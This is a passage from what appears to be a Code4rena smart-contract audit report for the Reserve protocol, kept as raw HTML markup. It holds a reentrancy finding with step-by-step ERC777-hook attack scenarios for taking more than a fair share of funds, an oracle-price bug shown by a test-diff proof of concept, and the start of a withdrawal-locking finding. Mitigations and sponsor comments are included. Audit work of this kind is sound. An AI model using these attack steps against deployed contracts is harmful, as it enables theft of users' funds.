IERC20Upgradeable(erc20s[i]).safeTransferFrom(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                address(backingManager),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                redeemer,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                amounts[i]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (allZero) revert(&quot;Empty redemption&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As you can see code calculates withdrawal amount of each basket erc20 tokens by calling <code>basketHandler.quote()</code> and then bounds each withdrawal by the prorata share of token balance, in case protocol is under-collateralized. and then code updates <code>basketsNeeded</code> and in the end transfers the tokens.  if one of those tokens were ERC777 then that token would call receiver hook function in token transfer. there may be other 3rd party protocol tokens that calls registered hook functions during the token transfer. as reserve protocol is permission less and tries to work with all tokens so the external call in the token transfer can call hook functions. attacker can use this hook and perform reentrancy attack.</p>\n<p>This is <code>fullyCollateralized()</code> code in BasketHandler:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function fullyCollateralized() external view returns (bool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return basketsHeldBy(address(backingManager)) &gt;= rToken.basketsNeeded();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As you can see it calculates baskets that can be held by backingManager tokens balance and needed baskets by RToken contract and by comparing them determines that if RToken is fully collateralized or not. If RToken is fully collateralized then <code>BackingManager.manageTokens()</code> would call <code>handoutExcessAssets()</code> and would distribute extra funds between RToken holders and RSR stakers.</p>\n<p>The root cause of the issue is that during tokens transfers in <code>redeem()</code> not all the basket tokens balance of the BackingManager updates once and if one has hook function which calls attacker contract then attacker can use this updated token balance of the contract and perform his reentrancy attack. attacker can call different functions for reentrancy. these are two scenarios:</p>\n<p><strong>Scenario #1: attacker call <code>redeem()</code> again and bypass prorata share bound check when protocol is under-collaterialized:</strong></p>\n<ol>\n<li>tokens [<code>SOME_ERC777</code>, <code>USDT</code>] with quantity [1, 1] are in the basket right now and basket nonce is BasketNonce1.</li>\n<li>BackingManager has 200K <code>SOME_ERC777</code> balance and 100K <code>USDT</code> balance. <code>basketsNeeded</code> in RToken is 150K and RToken supply is 150K and attacker address Attacker1 has 30k RToken. battery charge allows for attacker to withdraw 30K tokens in one block.</li>\n<li>attacker would register a hook for his address in <code>SOME_ERC777</code> token to get called during transfers.</li>\n<li>attacker would call <code>redeem()</code> to redeem 15K RToken and code would updated <code>basketsNeeded</code> to 135K and code would bounds withdrawal by prorata shares of balance of the BackingManager because protocol is under-collateralized and code would calculated withdrawal amouns as 15K <code>SOME_ERC777</code> tokens and 10K <code>USDT</code> tokens (instead of 15K <code>USDT</code> tokens) for withdraws.</li>\n<li>then contract would transfer 15K <code>SOME_ERC777</code> tokens first to attacker address and attacker contract would get called during the hook function and now <code>basketsNeeded</code> is 135K and total RTokens is 135K and BackingManager balance is 185K <code>SOME_ERC777</code> and 100K <code>USDT</code> (<code>USDT</code> is not yet transferred). then attacker contract can call <code>redeem()</code> again for the remaining 15K RTokens.</li>\n<li>because protocol is under-collateralized code would calculated withdrawal amouns as 15K <code>SOME_ERC777</code> and 11.1K <code>USDT</code> (USDT<em>balance * rtokenAmount / totalSupply = 100K * 15K / 135K) and it would burn 15K RToken form caller and the new value of totalSupply of RTokens would be 120K and <code>basketsNeeded</code> would be 120K too. then code would transfers 15K `SOME</em>ERC777<code>and 11.1K</code>USDT` for attacker address.</li>\n<li>attacker’s hook function would return and <code>redeem()</code> would transfer 10K <code>USDT</code> to attacker in the rest of the execution. attacker would receive 30K <code>SOME_ERC777</code> and 21.1K <code>USDT</code> tokens for 15K redeemed RToken but attacker should have get (<code>100 * 30K / 150K = 20K</code>) 20K <code>USDT</code> tokens because of the bound each withdrawal by the prorata share, in case we’re currently under-collateralized.</li>\n<li>so attacker would be able to bypass the bounding check and withdraw more funds and stole other users funds. the attack is more effective if withdrawal battery charge is higher but in general case attacker can perform two withdraw each with about <code>charge/2</code> amount of RToken in each block and stole other users funds when protocol is under collaterlized.</li>\n</ol>\n<p><strong>Scenario #2: attacker can call <code>BackingManager.manageTokens()</code> for reentrancy call:</strong></p>\n<ol>\n<li>tokens [<code>SOME_ERC777</code>, <code>USDT</code>] with quantity [1, 1] are in the basket right now and basket nonce is BasketNonce1.</li>\n<li>BackingManager has 200K <code>SOME_ERC777</code> balance and 150K <code>USDT</code> balance. <code>basketsNeeded</code> in RToken is 150K and RToken supply is 150K and attacker address Attacker1 has 30k RToken. battery charge allows for attacker to withdraw 30K tokens in one block.</li>\n<li>attacker would register a hook for his address in <code>SOME_ERC777</code> token to get called during transfers.</li>\n<li>attacker would call <code>redeem()</code> to redeem 30K RToken and code would updated <code>basketsNeeded</code> to 120K and burn 30K RToken and code would calculated withdrawal amounts as 30K <code>SOME_ERC777</code> tokens and 30K <code>USDT</code> tokens for withdraws.</li>\n<li>then contract would transfer 30K <code>SOME_ERC777</code> tokens first to attacker address and attacker contract would get called during the hook function and now <code>basketsNeeded</code> is 120K and total RTokens is 120K and BackingManager balance is 170K <code>SOME_ERC777</code> and 150K <code>USDT</code> (<code>USDT</code> is not yet transferred). then attacker contract can call <code>BackingManager.manageTokens()</code>.</li>\n<li>function <code>manageTokens()</code> would calculated baskets can held by BackingManager and it would be higher than 150K and <code>basketsNeeded</code> would be 130K and code would consider 60K <code>SOME_ERC777</code> and 30K <code>USDT</code> tokens as revenue and try to distribute it between RSR stakers and RToken holders. code would mint 30K RTokens and would distribute it.</li>\n<li>then attacker hook function would return and <code>redeem()</code> would transfer 30K <code>USDT</code> to attacker address in rest of the execution.</li>\n<li>so attacker would able to make code to calculate RToken holders backed tokens as revenue and distribute it between RSR stakers and RSR stakers would receive RTokens backed tokens as rewards. the attack is more effective is battery charge is high but in general case attacker can call redeem for battery charge amount and cause those funds to be counted and get distributed to the RSR stakers (according to the rewards distribution rate)</li>\n</ol>\n<h3 id=\"tools-used-5\" style=\"position:relative;\"><a href=\"#tools-used-5\" aria-label=\"tools used 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VIM</p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Prevent reading reentrancy attack by central reentrancy guard or by one main proxy interface contract that has reentrancy guard.</p>\n<p>Or create contract state (similar to basket nonce) which changes after each interaction and check for contracts states change during the call. (start and end of the call)</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/347#issuecomment-1399382867\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Would like to get some sponsor comments on this once prior to final review. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/347#issuecomment-1404024005\">tmattimore (Reserve) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>We think it’s real. </p>\n<p>Other potential mitigation:<br></p>\n<ul>\n<li>governance level norm of excluding erc777 as collateral. Can’t fully enforce though, so not a full mitigation.</li>\n</ul>\n<p>Will discuss more and decide on mitigation path with team.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/347#issuecomment-1409453091\">0xean (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Thanks @tmattimore - I am going to downgrade to Medium due to the external requirements needed for it to become a reality. If I may ask, what is the hesitancy to simply introduce standard reentrancy modifiers? It’s not critical to the audit in any way, just more of my own curiosity. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/347#issuecomment-1426447206\">tbrent (Reserve) commented</a>:</strong></p>\n<blockquote>\n<p>@0xean - we would need a global mutex in order to prevent the attack noted here, which means lots of gas-inefficient external calls. The classic OZ modifier wouldn’t be enough. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-assetlotprice-doesnt-use-the-most-recent-price-in-case-of-oracle-timeout\" style=\"position:relative;\"><a href=\"#m-08-assetlotprice-doesnt-use-the-most-recent-price-in-case-of-oracle-timeout\" aria-label=\"m 08 assetlotprice doesnt use the most recent price in case of oracle timeout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/326\">[M-08] <code>Asset.lotPrice()</code> doesn’t use the most recent price in case of oracle timeout</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/326\">0xA5DF</a></em></p>\n<p><code>Asset.lotPrice()</code> has a fallback mechanism in case that <code>tryPrice()</code> fails - it uses the last saved price and multiplies its value by <code>lotMultiplier</code> (a variable that decreases as the time since the last saved price increase) and returns the results.</p>\n<p>However, the <code>tryPrice()</code> might fail due to oracle timeout, in that case the last saved price might be older than the oracle’s price.</p>\n<p>This can cause the backing manager to misestimate the value of the asset, trade it at a lower price, or do an unnecessary haircut.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In the PoC below:</p>\n<ul>\n<li>Oracle price is set at day 0</li>\n<li>The asset is refreshed (e.g. somebody issued/vested/redeemed)</li>\n<li>After 5 days the oracle gets an update</li>\n<li>25 hours later the <code>lotPrice()</code> is calculated based on the oracle price from day 0 even though a price from day 5 is available from the oracle</li>\n<li>Oracle gets another update</li>\n<li>25 hours later the <code>lotPrice()</code> goes down to zero since it considers the price from day 0 (which is more than a week ago) to be the last saved price, even though a price from a day ago is available from the oracle</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/test/fixtures.ts b/test/fixtures.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 5299a5f6..75ca8010 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/fixtures.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/fixtures.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -69,7 +69,7 @@ export const SLOW = !!useEnv(&#39;SLOW&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> export const PRICE_TIMEOUT = bn(&#39;604800&#39;) // 1 week</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-export const ORACLE_TIMEOUT = bn(&#39;281474976710655&#39;).div(2) // type(uint48).max / 2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+export const ORACLE_TIMEOUT = bn(&#39;86400&#39;) // one day</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> export const ORACLE_ERROR = fp(&#39;0.01&#39;) // 1% oracle error</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/test/plugins/Asset.test.ts b/test/plugins/Asset.test.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index d49c53f3..7f2f721e 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/plugins/Asset.test.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/plugins/Asset.test.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -233,6 +233,45 @@ describe(&#39;Assets contracts #fast&#39;, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    it(&#39;PoC lot price doesn\\&#39;t use most recent price&#39;, async () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      // Update values in Oracles to 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      await setOraclePrice(rsrAsset.address, bn(&#39;1.1e8&#39;))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      await rsrAsset.refresh();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      let [lotLow, lotHigh] = await rsrAsset.lotPrice();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      let descripion = &quot;day 0&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      console.log({descripion, lotLow, lotHigh});</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      let hour = 60*60;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      let day = hour*24;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      await advanceTime(day * 5);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      await setOraclePrice(rsrAsset.address, bn(&#39;2e8&#39;));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      // await rsrAsset.refresh();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      [lotLow, lotHigh] = await rsrAsset.lotPrice();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      descripion = &#39;after 5 days (right after update)&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      console.log({descripion,lotLow, lotHigh});</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      await advanceTime(day + hour);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      // Fallback prices should be zero</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      [lotLow, lotHigh] = await rsrAsset.lotPrice();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      descripion = &#39;after 6+ days&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      console.log({descripion, lotLow, lotHigh});</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      await setOraclePrice(rsrAsset.address, bn(&#39;2e8&#39;));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      await advanceTime(day + hour);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      [lotLow, lotHigh] = await rsrAsset.lotPrice();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      descripion = &#39;after 7+ days&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      console.log({descripion, lotLow, lotHigh});</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     it(&#39;Should return (0, 0) if price is zero&#39;, async () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       // Update values in Oracles to 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       await setOraclePrice(compAsset.address, bn(&#39;0&#39;))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -595,6 +634,7 @@ describe(&#39;Assets contracts #fast&#39;, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       expect(lotHighPrice4).to.be.equal(bn(0))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   describe(&#39;Constructor validation&#39;, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     it(&#39;Should not allow price timeout to be zero&#39;, async () =&gt; {</span></span></span></code></pre>\n<p>Output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  descripion: &#39;day 0&#39;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  lotLow: BigNumber { value: &quot;1089000000000000000&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  lotHigh: BigNumber { value: &quot;1111000000000000000&quot; }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  descripion: &#39;after 5 days (right after update)&#39;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  lotLow: BigNumber { value: &quot;1980000000000000000&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  lotHigh: BigNumber { value: &quot;2020000000000000000&quot; }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  descripion: &#39;after 6+ days&#39;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  lotLow: BigNumber { value: &quot;149087485119047618&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  lotHigh: BigNumber { value: &quot;152099353505291005&quot; }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  descripion: &#39;after 7+ days&#39;, // `lotPrice()` returns zero even though the most recent price the oracle holds is from 25 hours ago</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  lotLow: BigNumber { value: &quot;0&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  lotHigh: BigNumber { value: &quot;0&quot; }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Allow specifying a timeout to <code>tryPrice()</code>, in case that <code>tryPrice()</code> fails due to oracle timeout then call it again with <code>priceTimeout</code> as the timeout.</p>\n<p>If the call succeeds the second time then use it as the most recent price for fallback calculations.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/326#issuecomment-1405530751\">tbrent (Reserve) commented</a>:</strong></p>\n<blockquote>\n<p>Nice find! When <code>StalePrice()</code>is thrown in <code>OracleLib.sol</code>, it should revert with the latest price, and this latest price should be used in the asset plugin.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/326\">tbrent (Reserve) acknowledged</a></strong></p>\n<hr>\n<h2 id=\"m-09-withdrawals-will-stuck\" style=\"position:relative;\"><a href=\"#m-09-withdrawals-will-stuck\" aria-label=\"m 09 withdrawals will stuck permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/325\">[M-09] Withdrawals will stuck</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/325\">csanuragjain</a></em></p>\n<p>If a new era gets started for stakeRSR and draftRSR still point to old era then user will be at risk of losing their future holdings.</p>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>seizeRSR is called with amount 150 where stakeRSR was 50 and draftRSR was 80. The era was 1 currently for both stake and draft</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function seizeRSR(uint256 rsrAmount) external notPausedOrFrozen {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    stakeRSR -= stakeRSRToTake;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ..</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (stakeRSR == 0 || stakeRate &gt; MAX_STAKE_RATE) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                seizedRSR += stakeRSR;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                beginEra();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ...</span></span>\n<span class=\"grvsc-line\"><span 